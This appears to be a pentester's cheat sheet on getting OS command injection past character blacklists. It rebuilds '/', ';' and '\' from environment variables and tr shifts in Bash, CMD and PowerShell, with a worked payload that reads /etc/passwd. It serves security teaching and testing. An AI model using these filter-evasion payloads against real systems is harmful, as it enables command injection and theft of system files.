
# OS Command Injection - Environment & Dynamic Bypass

## 🧠 Overview
When critical characters like `/`, `;`, or `\` are blacklisted, we cannot use them directly in our payloads. However, we can bypass these restrictions by extracting these characters dynamically from the system's own environment variables.

---

## 🐧 Linux Bypass Techniques

### 🔹 Substring Extraction from `$PATH`
Environment variables like `$PATH` usually contain characters we need (like `/`). We can extract them using shell syntax `${VARIABLE:offset:length}`.

- **Extracting `/`:** 
  # First character of PATH is usually '/'
  ${PATH:0:1}
  ```
  # Example Usage (cat /etc/passwd)
  cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
  ```

- **Extracting `;` (Command Chaining):**
  Using `$LS_COLORS` or `$LANG` often yields special symbols:
  ```bash
  # Extract semicolon
  ${LS_COLORS:10:1}
  ```

### 🔹 Character Shifting (ASCII Manipulation)
If we cannot use a specific character, we can generate it by shifting ASCII ranges with `tr`:
```bash
# Generate backslash '\' from '['
echo $(tr '!-}' '"-~' <<< '[')
```

---

## 🪟 Windows Bypass Techniques

Windows environment variables are gold mines for hidden characters.

### 🔹 CMD Variable Substring
CMD allows index-based extraction from variables like `%HOMEPATH%` or `%PROGRAMFILES%`:
```cmd
# Extracting backslash
echo %HOMEPATH:~6,1%
```

### 🔹 PowerShell Variable Indexing
PowerShell is significantly more powerful for this manipulation:
```powershell
# Get the first character of the home path (usually 'C')
$env:HOMEPATH[0]

# Find hidden characters by listing all environment variables
Get-ChildItem Env:
```

---

## 🛠️ Discovery Workflow
When you don't know which variable contains the character you need:

1. **List all variables:**
   - **Linux:** `env` or `printenv`
   - **Windows:** `set` (CMD) or `Get-ChildItem Env:` (PS)
2. **Scan for characters:** Look for the character you need in the output.
3. **Index:** Calculate the index/offset needed to extract that character.
4. **Assemble:** Build your payload dynamically.

---

## 🧠 Pentester Mindset
* **Stop typing, start extracting.** When a filter blocks you, stop trying to find a "typo" and start looking at the environment variables.
* **Logic over Syntax.** The filter is looking for static characters. By building your command dynamically, you render the filter blind because the "forbidden" characters don't exist in your payload until the shell executes it.
* **Be Adaptive.** A payload that works on a default Ubuntu server might fail on an Alpine Docker container. Always perform an environment scan (`env`) first.

---

## 💣 Key Insight
* **Filters are static; Environments are dynamic.** By shifting the payload construction to the runtime phase (shell execution), you bypass the pre-execution static analysis filters.

---

## 📚 Further Resources
- [Bash Parameter Expansion Guide](https://www.gnu.org/software/bash/manual/html_node/Shell-Parameter-Expansion.html)
- [PowerShell Environment Variables](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_environment_variables)
